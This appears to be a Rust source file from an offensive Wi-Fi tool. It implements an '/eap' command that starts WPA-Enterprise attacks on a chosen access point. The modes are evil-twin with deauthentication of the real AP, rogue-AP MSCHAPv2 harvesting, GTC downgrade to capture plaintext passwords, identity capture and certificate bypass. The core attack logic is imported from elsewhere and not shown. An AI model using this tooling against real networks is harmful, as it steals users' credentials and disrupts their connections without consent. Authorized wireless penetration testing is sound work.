//! EAP enterprise credential capture command: /eap [mode] [target]

use crate::attacks::eap::{EapParams, EapAttackMode};
use crate::cli::module::Module;
use crate::cli::views::eap as eap_cli;
use super::{Ctx, Mode};

/// /eap [mode] [target] | /eap stop
pub fn run(ctx: &mut Ctx, args: &str) {
    let args = args.trim();

    // /eap stop -> stop active attack
    if args == "stop" {
        let state = ctx.state.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(eap_mod) = state.focus_stack.find_as::<eap_cli::EapModule>("eap") {
            eap_mod.attack().signal_stop();
            drop(state);
            ctx.layout.print(&format!("  {} Stopping EAP attack...",
                prism::s().dim().paint("\u{25cf}")));
        } else {
            drop(state);
            ctx.layout.print(&format!("  {} No EAP attack running.",
                prism::s().dim().paint("\u{25cf}")));
        }
        return;
    }

    // /eap (no args) -> show help
    if args.is_empty() {
        ctx.layout.print(&format!("  {} Usage: {} [mode] [target]",
            prism::s().cyan().paint("?"),
            prism::s().cyan().paint("/eap")));
        ctx.layout.print(&format!("  {}", prism::s().dim().paint("Available modes:")));
        ctx.layout.print(&format!("    {}  {}",
            prism::s().cyan().bold().paint(&format!("{:<20}", "evil-twin")),
            prism::s().dim().paint("Clone target AP, deauth real, capture credentials")));
        ctx.layout.print(&format!("    {}  {}",
            prism::s().cyan().bold().paint(&format!("{:<20}", "harvest")),
            prism::s().dim().paint("Rogue AP with target SSID, MSCHAPv2 capture")));
        ctx.layout.print(&format!("    {}  {}",
            prism::s().cyan().bold().paint(&format!("{:<20}", "downgrade")),
            prism::s().dim().paint("Force GTC \u{2014} capture plaintext passwords!")));
        ctx.layout.print(&format!("    {}  {}",
            prism::s().cyan().bold().paint(&format!("{:<20}", "identity")),
            prism::s().dim().paint("Stealth \u{2014} capture usernames/domains only")));
        ctx.layout.print(&format!("    {}  {}",
            prism::s().cyan().bold().paint(&format!("{:<20}", "cert-bypass")),
            prism::s().dim().paint("Clone target, accept all certs, MSCHAPv2")));
        ctx.layout.print(&format!("  {} Default: evil-twin (targets selected AP)",
            prism::s().dim().paint(" ")));
        return;
    }

    // Check if an attack is already running
    if !ctx.require_no_attack() { return; }

    // Parse: optional mode + optional target
    let parts: Vec<&str> = args.splitn(2, char::is_whitespace).collect();
    let (eap_mode, target_arg) = match parts[0].to_lowercase().as_str() {
        "evil-twin" | "eviltwin" | "twin" => (EapAttackMode::EvilTwin, parts.get(1).map(|s| s.trim()).unwrap_or("")),
        "harvest" | "credential" => (EapAttackMode::CredentialHarvest, parts.get(1).map(|s| s.trim()).unwrap_or("")),
        "downgrade" | "gtc" => (EapAttackMode::EapDowngrade, parts.get(1).map(|s| s.trim()).unwrap_or("")),
        "identity" | "id" => (EapAttackMode::IdentityTheft, parts.get(1).map(|s| s.trim()).unwrap_or("")),
        "cert-bypass" | "cert" => (EapAttackMode::CertBypass, parts.get(1).map(|s| s.trim()).unwrap_or("")),
        _ => (EapAttackMode::EvilTwin, args), // No mode given, treat whole args as target
    };

    // Need scanner running
    if !ctx.require_scanner() { return; }
    if !ctx.require_adapter() { return; }

    // Resolve target AP (single target only)
    let target_ap = match ctx.resolve_target(target_arg) {
        Ok(Some(ap)) => ap,
        Ok(None) => {
            ctx.layout.print(&format!("  {} EAP requires a single target AP.",
                prism::s().red().paint("!")));
            return;
        }
        Err("no_aps") => {
            ctx.layout.print(&format!("  {} No APs discovered yet. Wait for scan results.",
                prism::s().yellow().paint("\u{26a0}")));
            return;
        }
        Err("ap_not_found") => {
            ctx.layout.print(&format!("  {} AP not found: {}",
                prism::s().red().paint("!"), target_arg));
            return;
        }
        Err(_) => {
            ctx.layout.print(&format!("  {} Scanner not running. Start with {} first.",
                prism::s().yellow().paint("\u{26a0}"),
                prism::s().cyan().paint("/scan")));
            return;
        }
    };

    // Build params
    let params = EapParams {
        mode: eap_mode,
        deauth_original: matches!(eap_mode, EapAttackMode::EvilTwin | EapAttackMode::CertBypass),
        ..Default::default()
    };

    // Print start message
    ctx.layout.print(&format!("  {} EAP {} \u{2192} {}  {}  ch{}",
        prism::s().red().paint("\u{25b6}"),
        prism::s().cyan().bold().paint(eap_mode.name()),
        prism::s().bold().paint(&target_ap.ssid),
        prism::s().dim().paint(&target_ap.bssid.to_string()),
        target_ap.channel));

    // Select adapter for attack (prompt if multiple)
    let attack_adapter = match ctx.select_adapter_for_attack("EAP attack") {
        Some(a) => a,
        None => return,
    };

    // Create EAP module and start
    let mut eap_module = eap_cli::EapModule::new(params);
    eap_module.set_target(target_ap);
    eap_module.start(attack_adapter);

    ctx.layout.print(&format!("  {} Attack started. Rogue AP broadcasting. {} to stop.",
        prism::s().green().paint("\u{25cf}"),
        prism::s().cyan().paint("/eap stop")));
    ctx.layout.print("");

    // Push to focus stack
    {
        let mut state = ctx.state.lock().unwrap_or_else(|e| e.into_inner());
        state.focus_stack.push(Box::new(eap_module));
        state.mode = Mode::Normal;
    }
}
